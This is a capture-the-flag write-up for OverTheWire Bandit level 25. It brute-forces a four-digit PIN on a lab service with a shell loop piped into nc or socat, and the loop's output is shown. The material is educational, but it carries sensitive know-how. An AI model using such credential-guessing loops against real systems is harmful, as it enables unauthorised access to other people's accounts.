# OverTheWire - Bandit - Level 25

[OverTheWire](https://overthewire.org) offers a series of "wargames" that teach
security skills. From their website:

> The Bandit wargame is aimed at absolute beginners. It will teach the basics
> needed to be able to play other wargames.

## Challenge Overview

This challenge provides a server running on port 30002. It takes the `bandit24`
password plus a four digit PIN, and if both are correct then the `bandit25`
password is returned. The hints are that it needs to be brute forced, and that a
new connection is not needed for each guess.

Then use `ssh` to log into the server as the `bandit24` user.

## Commands Used to Solve This Challenge

- `cat`: concatenate files and print on the standard output
- `ls`: list directory contents
- `ssh`: OpenSSH remote login client

## Initial Analysis

This is a new type of challenge, to brute force a PIN by trying every
combination. For a four digit PIN there are 10,000 combinations so the
"keyspace" is reasonable for brute forcing. A new connnection is not needed for
each guess, and that will reduce the time to try all the combinations.

The information from the previous challenge is used to `ssh` into the server.

## Understanding the Challenge

This challenge introduces the concept of "brute force". When passwords or PINs
are short enough that it's possible to try every value, then brute force is
often an option.

## Approach Strategy

1. Log in using `ssh`
1. Connect to port 30002 to see how it works
1. Come up with a way to brute force the PIN

## Step-by-Step Solution

The login information from the previous challenge is used to get a shell as user
`bandit23`. Using `nc` to connect to port 30002 gives:

```
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
guitarwolf 1234
Wrong! Please enter the correct current password and pincode. Try again.
basswolf 5678
Wrong! Please enter the correct current password and pincode. Try again.
^C
bandit24@bandit:~$
```

OK, so now the format is known, and the question is how to generate the 10,000
PINs. The `for` loop is a common way to iterate through things, so it is
naturally available as a shell command. Start with the first three values as it
is easier to work with:

```
bandit24@bandit:~$ for i in {0000..0002}; do echo $i; done
0000
0001
0002
bandit24@bandit:~$
```

That's a great start. The `for` loop syntax takes a little time to remember, but
it is powerful.This is looking good, so now to try it with the server using a
dummy password:

```
bandit24@bandit:~$ for i in {0000..0002}; do echo password $i; done | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
^C
bandit24@bandit:~$
```

Nice! Now if there are 9,999 responses that are wrong and one that's right, it
is a bit of a pain to scroll through the output. The `grep` command can be used
to remove output, although this is a bit risky since the output for the correct
answer is unknown:

```
bandit24@bandit:~$ for i in {0000..0002}; do echo password $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
^C
bandit24@bandit:~$
```

It looks like it's ready to go. The only thing needed is to use the real
password. Shell scripting can run sub-shells using the `$(command)` syntax. So
to `cat` the `bandit24` password it would be:

```
bandit24@bandit:~$ for i in {0000..9999}; do echo $(cat /etc/bandit_pass/bandit24) $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is [REMOVED: BANDIT25 PASSWORD]

bandit24@bandit:~$
```

This worked, although it took nearly a minute to reach the correct PIN. While
the script is running it's unsure if it's still trying PIN combinations, or if
something went wrong and the server is waiting for input. The important thing is
that it worked!

Note that while the password _could_ be used as a literal value in the command,
that is not a secure way to do things. Any other user on the server can look at
the processes being run - including the command line arguments.

To confirm that the password is correct, disconnect from the server and then
reconnect using the `bandit25` user and the found password (`/etc/issue` and
`/etc/motd` removed):

```
bandit24@bandit:~$
logout
Connection to bandit.labs.overthewire.org closed.
$ ssh bandit25@bandit.labs.overthewire.org -p 2220
[REMOVED: /etc/issue]
bandit25@bandit.labs.overthewire.org's password:
[REMOVED: /etc/motd]
bandit25@bandit:~$
```

## Key Takeaways

Brute forcing is an important part of security. For example, you would never use
a single digit PIN for a credit card, as it would be too easy to try all 10
possibilities. With computers able to try guesses at incredible speed, the
"keyspace" of possible keys needs to be large enough that brute force is not an
option.

## Beyond the Flag

It's good practice to solve things in different ways. What are some other ways
to solve this challenge?

Perhaps this could be done using `socat` instead of `nc`? The `socat` command
works very similarly to `nc` for TCP connections, but also works with a wide
variety of other data sources and sinks. It's a good tool to learn.

```
bandit24@bandit:~$ for i in {0000..9999}; do echo $(cat /etc/bandit_pass/bandit24) $i; done | socat - TCP:localhost:30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is [REMOVED: BANDIT25 PASSWORD]

bandit24@bandit:~$
```
